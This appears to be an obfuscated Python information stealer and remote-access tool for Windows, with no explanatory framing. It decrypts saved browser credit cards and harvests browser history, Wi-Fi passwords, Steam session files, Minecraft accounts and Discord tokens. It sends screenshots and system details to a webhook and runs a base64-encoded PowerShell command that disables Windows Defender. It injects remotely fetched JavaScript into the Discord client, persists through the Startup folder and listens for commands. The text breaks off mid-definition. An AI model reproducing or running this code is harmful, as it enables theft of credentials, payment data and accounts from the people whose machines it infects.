    O0OOO0OOOO0000000 =(subprocess .check_output ("wmic csproduct get uuid",shell =True ).decode ("utf-8").strip ().split ("\n")[1 ].strip ())
    OOO0O00OO000OOOOO =get ("https://api.ipify.org/?format=json").json ()
    O0O00OO0OOO000000 =OO000O00O0OO0O00O ()
    with open ("machine.txt","w")as OO00O000OOOOOOOOO :
        OO00O000OOOOOOOOO .write (f"PC: {platform.node()}\n")
        OO00O000OOOOOOOOO .write (f"OS: {platform.platform()}\n")
        OO00O000OOOOOOOOO .write (f"RAM: {O0OO0OOOOO000OOOO.total / 1073741824} GB\n")
        OO00O000OOOOOOOOO .write (f"GPU: {', '.join(O000OO0O0000O000O)}\n")
        OO00O000OOOOOOOOO .write (f"CPU: {platform.processor()}\n")
        OO00O000OOOOOOOOO .write (f"HWID: {O0OOO0OOOO0000000}\n")
        OO00O000OOOOOOOOO .write (f"MAC: {O0O00OO0OOO000000}\n")
        OO00O000OOOOOOOOO .write (f"IP: {OOO0O00OO000OOOOO['ip']}\n")
def OOOOOO0OO0O0000OO (OOOO00O00O0OOO0O0 ):
    if not os .path .exists (OOOO00O00O0OOO0O0 ):
        return None 
    with open (os .path .join (OOOO00O00O0OOO0O0 ,"Local State"),"r",encoding ="utf-8")as O0OO000OOO0O000O0 :
        O0O0OO0OOO000O000 =json .load (O0OO000OOO0O000O0 )
    OO00O0O0O00OOO00O =base64 .b64decode (O0O0OO0OOO000O000 ["os_crypt"]["encrypted_key"])[5 :]
    OO00O0O0O00OOO00O =CryptUnprotectData (OO00O0O0O00OOO00O ,None ,None ,None ,0 )[1 ]
    return OO00O0O0O00OOO00O 
def O000OO00OO0O0O0OO (O0O0O000000OO0O0O ,OOOO0O000O0000O00 ):
    O0000000O0OOOO0OO =O0O0O000000OO0O0O [3 :15 ]
    OOO0O0O000O00OO0O =O0O0O000000OO0O0O [15 :]
    O00OOO0O00OOO0OOO =AES .new (OOOO0O000O0000O00 ,AES .MODE_GCM ,O0000000O0OOOO0OO )
    O0OO000O00OOO0000 =O00OOO0O00OOO0OOO .decrypt (OOO0O0O000O00OO0O )
    O0OO000O00OOO0000 =O0OO000O00OOO0000 [None :-16 ].decode ()
    return O0OO000O00OOO0000 
def OO0000O0O0O0OO0OO (O0O0000O0O0O00O0O ,O0OO00OOO0OOOO0OO ):
    OO0OO0O0OOO0000O0 =os .path .join (O0O0000O0O0O00O0O ,O0OO00OOO0OOOO0OO ,"History")
    O000O0OOOO0O0OO0O =""
    if not os .path .exists (OO0OO0O0OOO0000O0 ):
        return O000O0OOOO0O0OO0O 
    OO000000O00O0O000 =os .path .join (os .getenv ("TEMP"),"web_history_db")
    shutil .copy (OO0OO0O0OOO0000O0 ,OO000000O00O0O000 )
    O00OO0O0O0OO0OO0O =sqlite3 .connect (OO000000O00O0O000 )
    OO0000OOO0OO00000 =O00OO0O0O0OO0OO0O .cursor ()
    OO0000OOO0OO00000 .execute ("SELECT url, title, last_visit_time FROM urls")
    for OOO0O0OO0000O0OO0 in OO0000OOO0OO00000 .fetchall ():
        if OOO0O0OO0000O0OO0 [0 ]and OOO0O0OO0000O0OO0 [1 ]:
            O000O0OOOO0O0OO0O +=f"\n        Browser: {O0OO00OOO0OOOO0OO}\n        URL: {OOO0O0OO0000O0OO0[0]}\n        Title: {OOO0O0OO0000O0OO0[1]}\n        Visited Time: {OOO0O0OO0000O0OO0[2]}\n        \n        "
    O00OO0O0O0OO0OO0O .close ()
    os .remove (OO000000O00O0O000 )
    return O000O0OOOO0O0OO0O 
def O00OO0O0O00OO0OOO (OO0000O0OO0O0OO0O ,OO00OO0O0OO0OOOOO ,O0O0O00O00OO0O0O0 ):
    O0O0O0OO0000O0O0O =os .path .join (OO0000O0OO0O0OO0O ,OO00OO0O0OO0OOOOO ,"Web Data")
    if not os .path .exists (O0O0O0OO0000O0O0O ):
        return ""
    OO00OO0OOO00O0000 =""
    OO0O000000O00O000 =os .path .join (os .getenv ("TEMP"),"cards_db")
    shutil .copy (O0O0O0OO0000O0O0O ,OO0O000000O00O000 )
    O00O0000OO00OOO0O =sqlite3 .connect (OO0O000000O00O000 )
    O0O0OO000O0OOO0O0 =O00O0000OO00OOO0O .cursor ()
    O0O0OO000O0OOO0O0 .execute ("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
    for OO0O0O0OO00OOOOOO in O0O0OO000O0OOO0O0 .fetchall ():
        if OO0O0O0OO00OOOOOO [0 ]and OO0O0O0OO00OOOOOO [1 ]and OO0O0O0OO00OOOOOO [2 ]and OO0O0O0OO00OOOOOO [3 ]:
            OO0000O0OOO0O0O00 =O000OO00OO0O0O0OO (OO0O0O0OO00OOOOOO [3 ],O0O0O00O00OO0O0O0 )
            OO00OO0OOO00O0000 +=("\n        Browser: "+OO00OO0O0OO0OOOOO +"\n        Name Card: "+OO0O0O0OO00OOOOOO [0 ]+"\n        Card Number: "+OO0000O0OOO0O0O00 +"\n        Expires:  "+OO0O0O0OO00OOOOOO [1 ]+" / "+OO0O0O0OO00OOOOOO [2 ]+"\n        Added: "+str (datetime .fromtimestamp (OO0O0O0OO00OOOOOO [4 ]))+"\n        \n        ")
    O00O0000OO00OOO0O .close ()
    os .remove (OO0O000000O00O000 )
    return OO00OO0OOO00O0000 
def OO00O0O0OOO00O000 (OO0OOOO0O00000OO0 ,O0OO0O0000O00O00O ):
    with open (O0OO0O0000O00O00O ,"a",encoding ="utf-8")as O0000OOOOO00OO0OO :
        O0000OOOOO00OO0OO .write (OO0OOOO0O00000OO0 )
def OO00OOOO0O0O0O0O0 ():
    O000O000O00OO000O (browsers )
def O000O000O00OO000O (O0O0OO0O0O0OOOO0O ):
    OO00OOO0O00O0O000 ="history.txt"
    O0OO0OO0O000OOO0O ="cards.txt"
    for O0O0OO0O0000OOO0O ,OOO0O000O00O0OO0O in O0O0OO0O0O0OOOO0O .items ():
        OOOO000O000OO0OOO =OOOOOO0OO0O0000OO (OOO0O000O00O0OO0O )
        if not OOOO000O000OO0OOO :
            continue 
        OO0000O0OO0OO000O =OO0000O0O0O0OO0OO (OOO0O000O00O0OO0O ,"Default")
        if OO0000O0OO0OO000O :
            OO00O0O0OOO00O000 (OO0000O0OO0OO000O ,OO00OOO0O00O0O000 )
        OOOO0OO0OOOOO0OO0 =O00OO0O0O00OO0OOO (OOO0O000O00O0OO0O ,"Default",OOOO000O000OO0OOO )
        if OOOO0OO0OOOOO0OO0 :
            OO00O0O0OOO00O000 (OOOO0OO0OOOOO0OO0 ,O0OO0OO0O000OOO0O )
def O000O000O0000O00O ():
    OO00OOO00OOOOO0O0 =(lambda :subprocess .check_output ("chcp").decode ().split (":")[1 ].strip ())
    O00O0O0OOO0O000OO =OO00OOO00OOOOO0O0 ()
    OO0O0OOOO0000O0O0 =subprocess .check_output ("systeminfo").decode (O00O0O0OOO0O000OO )
    O00O00OOOO0OOO00O =os .path .join (os .getcwd (),"system_info.txt")
    with open (O00O00OOOO0OOO00O ,"w")as O0OO0O00OOOOO0000 :
        O0OO0O00OOOOO0000 .write (OO0O0OOOO0000O0O0 )
    try :
        OOOOOO0OO000O0O0O =(subprocess .check_output ("netsh wlan show profiles").decode (O00O0O0OOO0O000OO ).split ("\n"))
        OO00O00OO0O0OO0OO =[O00O0000OOOO00O00 .split (":")[1 ].strip ()for O00O0000OOOO00O00 in OOOOOO0OO000O0O0O if "All User Profile"in O00O0000OOOO00O00 ]
        for OOOO0OO00O000O000 in OO00O00OO0O0OO0OO :
            try :
                O0O00O0000O0OOOOO =subprocess .check_output (f'netsh wlan show profile name="{OOOO0OO00O000O000}" key=clear').strip ()
                O000O0OO000O000OO =O0O00O0000O0OOOOO .decode (O00O0O0OOO0O000OO )
                OO00000O0OOOO0O0O =f"\n\nProfile: {OOOO0OO00O000O000}\n\n{O000O0OO000O000OO}"
                with open (O00O00OOOO0OOO00O ,"a")as O0OO0O00OOOOO0000 :
                    O0OO0O00OOOOO0000 .write (OO00000O0OOOO0O0O )
            except subprocess .CalledProcessError as O0O0OOOOOO0O00O00 :
                print (f"Error retrieving data for profile: {OOOO0OO00O000O000}")
    except subprocess .CalledProcessError as O0O0OOOOOO0O00O00 :
        print ("Error retrieving WiFi profiles")
def OOOO0O0OOOO0O0OOO ():
    OOOOOOOOO0OO00OOO =(subprocess .check_output (["chcp"],shell =True ).decode ().split (":")[1 ].strip ().split (" ")[0 ])
    OO00OO00000O00O00 =int (OOOOOOOOO0OO00OOO )
    OOOOOOO0O00O0O0OO ="cp"+str (OO00OO00000O00O00 )
    return OOOOOOO0O00O0O0OO 
def O00O0O0OOOO0OOOOO (OOO0OOO000O00OO0O ):
    O0O000O0OO00O0OO0 =os .system ("taskkill /F /IM "+OOO0OOO000O00OO0O )
    if O0O000O0OO00O0OO0 ==0 :
        print ("Process "+OOO0OOO000O00OO0O +" has been killed successfully.")
    else :
        print ("Failed to kill process "+OOO0OOO000O00OO0O +".")
def OO00O0OOO0000OO0O ():
    O00O0O0OOOO0OOOOO ("Steam.exe")
    OOO00OOO00OOO0O00 =os .path .join (os .environ .get ("PROGRAMFILES(X86)",""),"Steam")
    if os .path .exists (OOO00OOO00OOO0O00 ):
        O0OOO000O0O0OO00O =[O0O0O00O00OOOO0OO for O0O0O00O00OOOO0OO in os .listdir (OOO00OOO00OOO0O00 )if O0O0O00O00OOOO0OO .startswith ("ssfn")]
        O0O00000O0O000O0O =os .path .join (OOO00OOO00OOO0O00 ,"config")
        O000O0OO0OO000OOO ="steam_session.zip"
        with zipfile .ZipFile (O000O0OO0OO000OOO ,"w",zipfile .ZIP_DEFLATED )as O0OO0OOOOOOOOO00O :
            if os .path .exists (O0O00000O0O000O0O ):
                for O0000O0O000O00OO0 ,O0OOOOOOO0O0O00O0 ,O00O000O00O0OOOOO in os .walk (O0O00000O0O000O0O ):
                    for OO0OO0OOOOOOOOOO0 in O00O000O00O0OOOOO :
                        O0OO0OOOOOOOOO00O .write (os .path .join (O0000O0O000O00OO0 ,OO0OO0OOOOOOOOOO0 ),os .path .relpath (os .path .join (O0000O0O000O00OO0 ,OO0OO0OOOOOOOOOO0 ),OOO00OOO00OOO0O00 ),)
            for OOO0O0OO00OOOO00O in O0OOO000O0O0OO00O :
                O0OO0OOOOOOOOO00O .write (OOO0O0OO00OOOO00O ,os .path .basename (OOO0O0OO00OOOO00O ))
        print ("Steam session data backed up successfully.")
        print ("Backup zip file saved at: "+O000O0OO0OO000OOO )
def OOOO0000OO00OOO0O ():
    O0O0OOO00OOO0O000 =os .getenv ("appdata")
    OO0OO00O000O0OOOO ="\\.minecraft\\launcher_accounts.json"
    OO0O0O0O0OO0O000O ="\\.minecraft\\usercache.json"
    OOOO0O0OO0OOOOO0O ={}
    O000OO00OO00O0O0O =os .path .join (O0O0OOO00OOO0O000 ,".minecraft",OO0OO00O000O0OOOO )
    if os .path .exists (O000OO00OO00O0O0O ):
        with open (O000OO00OO00O0O0O ,"r")as O00OOOOO00OO000OO :
            OOOO0O0OO0OOOOO0O ["session_info"]=json .load (O00OOOOO00OO000OO )
    OO0O00O0000OOO00O =os .path .join (O0O0OOO00OOO0O000 ,OO0O0O0O0OO0O000O )
    if os .path .exists (OO0O00O0000OOO00O ):
        with open (OO0O00O0000OOO00O ,"r")as O00OOOOO00OO000OO :
            OOOO0O0OO0OOOOO0O ["user_cache"]=json .load (O00OOOOO00OO000OO )
    with open ("minecraft.txt","w",encoding ="cp437")as O00OOOOO00OO000OO :
        O00OOOOO00OO000OO .write (json .dumps (OOOO0O0OO0OOOOO0O ,indent =4 ))
def OO00OO00O00O0000O (O0O00OOO00O00O00O ):
    OO000OO0O00O0000O =("Avast","AVG","Bitdefender","Kaspersky","McAfee","Norton","Sophos","ESET","Malwarebytes","Avira","Panda","Trend Micro","F-Secure","McAfee","Comodo","Avira","BullGuard","360 Total Security","Ad-Aware","Dr.Web","G-Data","Vipre","ClamWin","ZoneAlarm","Cylance","Webroot","Cylance","Palo Alto Networks","Symantec","SentinelOne","CrowdStrike","Emsisoft","HitmanPro","Fortinet","Trend Micro","Emsisoft","FireEye","Cylance","ESET","Zemana","McAfee","Windows Defender",)
    OO0O00OOO000O000O ={}
    for OOO0000O0OOOOOOO0 in os .listdir (O0O00OOO00O00O00O ):
        O0O0O0OOOO0OOOO00 =os .path .join (O0O00OOO00O00O00O ,OOO0000O0OOOOOOO0 )
        if os .path .isdir (O0O0O0OOOO0OOOO00 ):
            for OO00000OOO000OOO0 in OO000OO0O00O0000O :
                if OO00000OOO000OOO0 .lower ()in OOO0000O0OOOOOOO0 .lower ():
                    OO0O00OOO000O000O [OOO0000O0OOOOOOO0 ]=OO00000OOO000OOO0 
                    break 
    return OO0O00OOO000O000O 
def OO000O000O0000OO0 ():
    OOO00000O0OO0O000 ="C:\\Program Files"
    O0OO0OO0000OOOOOO =OO00OO00O00O0000O (OOO00000O0OO0O000 )
    OOO0O0O00OO00O0OO =open ("antivirus.txt","w")
    if O0OO0OO0000OOOOOO :
        for O0O000OO000000O00 ,OOOOOO000O0O0O00O in O0OO0OO0000OOOOOO .items ():
            OOO0O0O00OO00O0OO .write (f"{O0O000OO000000O00}: {OOOOOO000O0O0O00O}\n")
    else :
        OOO0O0O00OO00O0OO .write ("No antivirus found.")
    OOO0O0O00OO00O0OO .close ()
    return OOOOOO000O0O0O00O 
def OOOO0O000O00OO0OO ():
    OOOOO0O0OO00O0OOO =os .path .abspath (sys .argv [0 ])
    OOO00OO00OO00O000 =os .path .join (os .getenv ("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup")
    O0OOO0O0OOO000OOO =os .path .basename (OOOOO0O0OO00O0OOO )
    if any (OOO00OO000000OOO0 .lower ()==O0OOO0O0OOO000OOO .lower ()for OOO00OO000000OOO0 in os .listdir (OOO00OO00OO00O000 )):
        print ("Script is already in the startup folder.")
    else :
        shutil .copy (OOOOO0O0OO00O0OOO ,OOO00OO00OO00O000 )
def OOO000OO0OO0O0OO0 ():
    try :
        OOOOO0O0OOOO0OOO0 =GPUtil .getGPUs ()
        O000000O0000O00O0 =''
        for O0OOO00O0OO00OOOO in OOOOO0O0OOOO0OOO0 :
            O000000O0000O00O0 +=f"{O0OOO00O0OO00OOOO.name}, "
        return O000000O0000O00O0 [:-2 ]
    except Exception as O0OOOO00O00000000 :
        print (f"Error retrieving GPU information: {O0OOOO00O00000000}")
        return "Unknown GPU"
def OO0OOO0OO0O0OOOO0 ():
    try :
        OO0OO00O0OOOO0OOO =f"{psutil.virtual_memory().total // 1073741824} GB"
        O000OOO00OO000O00 =platform .platform ()
        OO000OOOOO0O0O00O =platform .system ()
        return (OO0OO00O0OOOO0OOO ,O000OOO00OO000O00 ,OO000OOOOO0O0O00O )
    except Exception as O00O0OO0OOOOOOOO0 :
        print (f"Error retrieving system information: {O00O0OO0OOOOOOOO0}")
        return ('Unknown','Unknown','Unknown')
def OOOOOOOO0O000O0O0 ():
    try :
        OO0O0OOO00O0O00O0 =requests .get ('https://api.ipify.org/')
        OO0O0OOO00O0O00O0 .raise_for_status ()
        OOO0000OOO0O00OOO =OO0O0OOO00O0O00O0 .text .strip ()
        return OOO0000OOO0O00OOO 
    except Exception as O0O0O00000OOO00OO :
        print (f'An error occurred: {O0O0O00000OOO00OO}')
def O00O0O0OOO0000O0O ():
    OO00OOO0O0OO00O0O =OOO000OO0OO0O0OO0 ()
    OOOOO0O000O000OOO ,OO00O00O0O00O00OO ,OO000O0OO0OOO0O0O =OO0OOO0OO0O0OOOO0 ()
    O00O0000O00OO0OOO =OO000O00O0OO0O00O ()
    OO0O00OOOO0OOO0OO =OOOOOOOO0O000O0O0 ()
    OO000O0O00OOOO000 =socket .gethostname ()
    OO00O0000OOOOOOOO =OO000O000O0000OO0 ()
    if not O00O0000O00OO0OOO :
        O00O0000O00OO0OOO ="Unknown MAC Address"
    O0O00OOO00OOO0OOO ={"title":"PC Information","color":65280 ,"fields":[{"name":"What AV Got Clowned On :clown:","value":OO00O0000OOOOOOOO ,"inline":False },{"name":"MAC Address","value":O00O0000O00OO0OOO ,"inline":True },{"name":"IP Address","value":OO0O00OOOO0OOO0OO ,"inline":False },{"name":"Computer Name","value":OO000O0O00OOOO000 ,"inline":True },{"name":"GPU Info","value":OO00OOO0O0OO00O0O ,"inline":False },{"name":"RAM Amount","value":OOOOO0O000O000OOO ,"inline":True },{"name":"OS Version","value":OO00O00O0O00O00OO ,"inline":False },{"name":"OS Name","value":OO000O0OO0OOO0O0O ,"inline":True }]}
    OOOO0O000OOO00000 =json .dumps ({"embeds":[O0O00OOO00OOO0OOO ]})
    OO0OOOOO0OO0OO0O0 ={"Content-Type":"application/json"}
    OO0O0000O0OO00OO0 =requests .post (O00OOO0OOOO0O000O ,data =OOOO0O000OOO00000 ,headers =OO0OOOOO0OO0OO0O0 )
    if OO0O0000O0OO00OO0 .status_code ==204 :
        print ("Request sent successfully.")
    else :
        print ("Failed to send request. Status code:",OO0O0000O0OO00OO0 .status_code )
def O0O0O000OOOO0OOOO ():
    try :
        OO0OO00000OOO0000 =[]
        O00O00OOO00O0O000 =os .getenv ('APPDATA')
        O00O00O0OOOOOOO0O =os .path .join (O00O00OOO00O0O000 ,'discord')
        if not os .path .exists (O00O00O0OOOOOOO0O ):
            return None 
        for OOO0O00OO0O00000O in os .listdir (os .path .join (O00O00O0OOOOOOO0O ,'Local Storage','leveldb')):
            if OOO0O00OO0O00000O .endswith ('.ldb'):
                O0OO000O0O000OO0O =os .path .join (O00O00O0OOOOOOO0O ,'Local Storage','leveldb',OOO0O00OO0O00000O )
                with open (O0OO000O0O000OO0O ,'r',encoding ='utf-8',errors ='ignore')as OOOOOOOO00O00O0O0 :
                    O0OO0OO0O000000O0 =OOOOOOOO00O00O0O0 .read ()
                    OO0O00O0000O00O00 =re .findall (r"tps://discord(?:app)?.com(.*?)\x00",O0OO0OO0O000000O0 )
                    for OO00O0000OO0OOO00 in OO0O00O0000O00O00 :
                        O0O000O00OOOO0O00 =OO00O0000OO0OOO00 .split ("\x01")[0 ]
                        if O0O000O00OOOO0O00 :
                            OO0OO00000OOO0000 .append (O0O000O00OOOO0O00 )
        return OO0OO00000OOO0000 
    except Exception as O0O0O00O00O0OO000 :
        print (f"Error occurred while getting Discord tokens: {O0O0O00O00O0OO000}")
        return None 
def OO00O00OO0O0OOO0O ():
    try :
        with mss .mss ()as OOOOO0O000O0000OO :
            OOOOO0O000O0000OO .shot (output ="screenshot.png")
        OO0O00OOO0OOO0OOO ={'file':open ('screenshot.png','rb')}
        OO00O0OO0O00O00O0 =requests .post (O00OOO0OOOO0O000O ,files =OO0O00OOO0OOO0OOO )
    except Exception as O000O000O0OO0O00O :
        print ("An error occurred:",O000O000O0OO0O00O )
        time .sleep (1000 )
def OOO0OO0O0OO0O0OO0 ():
    OOOOO00O00O000OOO =base64 .b64decode (b"cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK").decode ()
    subprocess .run (OOOOO00O00O000OOO ,shell =True ,capture_output =True )
def OOO00O0O00O00000O ():
    OOO0000O000OOOO0O =os .path .join (os .getenv ("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup",)
    OOOOO0OO0OO0O0000 =sys .argv [0 ]
    if any (OOO0OOOOO0O00O000 .lower ().endswith (".lnk")for OOO0OOOOO0O00O000 in os .listdir (OOO0000O000OOOO0O )):
        print ("Script is already in the startup folder.")
    else :
        O00OOO0O0O0000O0O =os .path .abspath (sys .argv [0 ])
        OOO0000O000OOOO0O =os .path .join (os .getenv ('APPDATA'),'Microsoft','Windows','Start Menu','Programs','Startup')
        OOOOO0OO0OO0O0000 =os .path .basename (O00OOO0O0O0000O0O )
        if any (OOOOOO0OO0O0O0O00 .lower ()==OOOOO0OO0OO0O0000 .lower ()for OOOOOO0OO0O0O0O00 in os .listdir (OOO0000O000OOOO0O )):
            print ('Script is already in the startup folder.')
        else :
            shutil .copy (O00OOO0O0O0000O0O ,OOO0000O000OOOO0O )
            with open (os .path .join (os .path .join (tempfile .gettempdir (),'startup_added.txt')),'w',encoding ='utf-8')as O0O000O00OO00OOOO :
                O0O000O00OO00OOOO .write ('Script added to startup')
            print ('Script successfully added to startup.')
def O000OO0OO00O0O0OO ():
    OOOO0OOOOO0OOOO0O =os .popen ('tasklist').readlines ()
    for OOOO00OO0OOOO000O in OOOO0OOOOO0OOOO0O :
        if "Discord"in OOOO00OO0OOOO000O :
            OOO0O0O0000OOOOO0 =int (OOOO00OO0OOOO000O .split ()[1 ])
            os .system (f"taskkill /F /PID {OOO0O0O0000OOOOO0}")
    try :
        O0OO0OOO0OOO000OO =f"https://raw.githubusercontent.com/notauthorisedxd/blocked/main/discord_inject.js"
        O0OOO0OOOO0OO0OO0 =os .getlogin ()
        OOO0OO00OOO0O0000 =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']
        for OO000O0O0000OO000 in OOO0OO00OOO0O0000 :
            OO0O0OO0000OOO00O =os .path .join (os .getenv ('LOCALAPPDATA'),OO000O0O0000OO000 )
            if os .path .isdir (OO0O0OO0000OOO00O ):
                for OO0000OO0O0OOO0O0 ,OO00O00OO0OO00OO0 ,O0OO000OO0OOO0000 in os .walk (OO0O0OO0000OOO00O ):
                    if 'app-'in OO0000OO0O0OOO0O0 :
                        for O0O00O0000OO00OOO in OO00O00OO0OO00OO0 :
                            if 'modules'in O0O00O0000OO00OOO :
                                O0OO0O000OOO00O00 =os .path .join (OO0000OO0O0OOO0O0 ,O0O00O0000OO00OOO )
                                for O0OO00OO00O0O00OO ,O000OO0OO0O00OO00 ,OOO00O00O0OOOOOO0 in os .walk (O0OO0O000OOO00O00 ):
                                    if 'discord_desktop_core-'in O0OO00OO00O0O00OO :
                                        for OO0O00OOOO00O0O00 ,OOO0O00O00000000O ,O00O0OO0O00O0000O in os .walk (O0OO00OO00O0O00OO ):
                                            if 'discord_desktop_core'in OO0O00OOOO00O0O00 :
                                                for O0O0OO0OO0O0000O0 in O00O0OO0O00O0000O :
                                                    if O0O0OO0OO0O0000O0 =='index.js':
                                                        O00O0000O00OO00OO =os .path .join (OO0O00OOOO00O0O00 ,O0O0OO0OO0O0000O0 )
                                                        OO0OO0OOOO0OO0O0O =requests .get (O0OO0OOO0OOO000OO ).text 
                                                        OO0OO0OOOO0OO0O0O =OO0OO0OOOO0OO0O0O .replace ("%WEBHOOK%",O00OOO0OOOO0O000O )
                                                        with open (O00O0000O00OO00OO ,"w",encoding ="utf-8")as OO0000O0OO0000OOO :
                                                            OO0000O0OO0000OOO .write (OO0OO0OOOO0OO0O0O )
    except Exception as OO00O0OO0OO000O00 :
        print (OO00O0OO0OO000O00 )
        time .sleep (20 )
def O000O00O00OO0OO00 ():
    OOOOOOO0OOO00OO0O ='127.0.0.1'
    OOOO0OOO00O0O00OO =12345 
    with socket .socket (socket .AF_INET ,socket .SOCK_STREAM )as O00O0OO00O0OOOOOO :
        O00O0OO00O0OOOOOO .bind ((OOOOOOO0OOO00OO0O ,OOOO0OOO00O0O00OO ))
        O00O0OO00O0OOOOOO .listen ()
        print ("Server listening on {}:{}".format (OOOOOOO0OOO00OO0O ,OOOO0OOO00O0O00OO ))
        while True :
            OO000OO000OO000OO ,OO0O0O0O00O0OO0OO =O00O0OO00O0OOOOOO .accept ()
            print ('Connected by',OO0O0O0O00O0OO0OO )
            OOO0OO0000O0OO0O0 =OO000OO000OO000OO .recv (1024 ).decode ()
            if OOO0OO0000O0OO0O0 :
                print ("Received command:",OOO0OO0000O0OO0O0 )
                OOO00O000OO00OO0O =OOO00O00000O0OOOO (OOO0OO0000O0OO0O0 )
                OO000OO000OO000OO .sendall (OOO00O000OO00OO0O .encode ())
            OO000OO000OO000OO .close ()
def OOO00O00000O0OOOO (O00O0OOO0000O00O0 ):
    if O00O0OOO0000O00O0 .lower ()=="open notepad":
        subprocess .Popen (["notepad.exe"])
        return "Notepad opened successfully."
    elif O00O0OOO0000O00O0 .lower ()=="startup":
        OOO00O0O00O00000O ()
        return "Added to startup successfully."
    elif O00O0OOO0000O00O0 .lower ()=="screenshot":
        OO00O00OO0O0OOO0O ()
        return "Screenshot captured and sent successfully."
    elif O00O0OOO0000O00O0 .lower ()=="pc info":
        O00O0O0OOO0000O0O ()
        return "PC info retrieved successfully."
    elif O00O0OOO0000O00O0 .lower ()=="disable defender":
        OOO0OO0O0OO0O0OO0 ()
        return "Windows Defender disabled successfully."
    elif O00O0OOO0000O00O0 .lower ()=="get ip":
        OOOOOOOO0O000O0O0 ()
def O0OOO00OO00OOO0O0 ():
    try :
        OO00OO0O0O00OO0OO =os .getenv ('APPDATA')
        O0OO0OOO00OOOO0O0 =OO00OO0O0O00OO0OO +"\\discord\\Local Storage\\leveldb"
        O000O000OOOOOO000 =[]
        for O0000O0O00OOOO000 in os .listdir (O0OO0OOO00OOOO0O0 ):
            if not O0000O0O00OOOO000 .endswith (".log")and not O0000O0O00OOOO000 .endswith (".ldb"):
                continue 
            for O0OO00000O00OO000 in [OOOO0O0O0OOO0OO0O .strip ()for OOOO0O0O0OOO0OO0O in open (f"{O0OO0OOO00OOOO0O0}\\{O0000O0O00OOOO000}",errors ="ignore").readlines ()if OOOO0O0O0OOO0OO0O .strip ()]:
                for OO00000O00OOO00O0 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",r"mfa\.[\w-]{84}"):
                    for OOOOO0OO0OOOO0O0O in findall (OO00000O00OOO00O0 ,O0OO00000O00OO000 ):
                        O000O000OOOOOO000 .append (OOOOO0OO0OOOO0O0O )
    except Exception as OO0OO00OO0OO000OO :
        print (OO0OO00OO0OO000OO )
    return O000O000OOOOOO000 
def O00O0OO00OO00O0OO (O0O000OOOOO00O0OO =None ,OO0OOOOO000000OO0 ="application/json"):
    O00OOO0000OOO0O0O ={"Content-Type":OO0OOOOO000000OO0 ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
    if O0O000OOOOO00O0OO :
        O00OOO0000OOO0O0O .update ({"Authorization":O0O000OOOOO00O0OO })
    return O00OOO0000OOO0O0O 
def OOOOO0O0OO00OO0OO (O0OOO0O0000000000 ):
    try :
        return bool (len (loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =O00O0OO00OO00O0OO (O0OOO0O0000000000 ))).read ().decode ()))>0 )
    except :
        pass 
def OO0OOO0OOO0OO0O00 ():
    O00O0O0OOO0000O0O ()
async def O0OOOO00O00OOO000 ():
    await O0O0OO0O0O0O0OOO0 ()
    OOO00O0O00O00000O ()
    OO0OOO0OOO0OO0O00 ()
    O000O00O00OO0OO00 ()
asyncio .run (O0OOOO00O00OOO000 ())
class O0OOOO0OOO0OOO0OO :
    def __init__ (OO0OOOOO0O0OO0OOO ):
        OO0OOOOO0O0OO0OOO .__O0OO00O0000O0OO00 ()
        OO0OOOOO0O0OO0OOO .__O0000000O0OOO0O00 ()
        OO0OOOOO0O0OO0OOO .__O000O00OOOOOOOOO0 ()
        OO0OOOOO0O0OO0OOO .__O0OOOO0O00000O0OO ()
        OO0OOOOO0O0OO0OOO .__O000OO00OO0OOO000 ()
        OO0OOOOO0O0OO0OOO .__O00O0000000OO00O0 ()
        OO0OOOOO0O0OO0OOO .__O0OO00O0000000OOO ()
        OO0OOOOO0O0OO0OOO .__O00OO0O0OO0O00OOO ()
        OO0OOOOO0O0OO0OOO .__O000O0OOO000OO0OO ()
        OO0OOOOO0O0OO0OOO .__O00OO0OOOOO0OOO0O ()
        OO0OOOOO0O0OO0OOO .__O000OOOOO000OOOO0 ()
        OO0OOOOO0O0OO0OOO .__OOO000OOOO0000O00 ()
        OO0OOOOO0O0OO0OOO .__O0OOOO0OOO00O0O0O ()
        OO0OOOOO0O0OO0OOO .__O00OOO0O0OO0O00O0 ()
    def __O0OO00O0000O0OO00 (O0OO000O00O0O0OOO ,OOO0OOOOOO00O0OO0 ,OO00OO000O0OOO0O0 ,OO00OO000000O0OOO ):
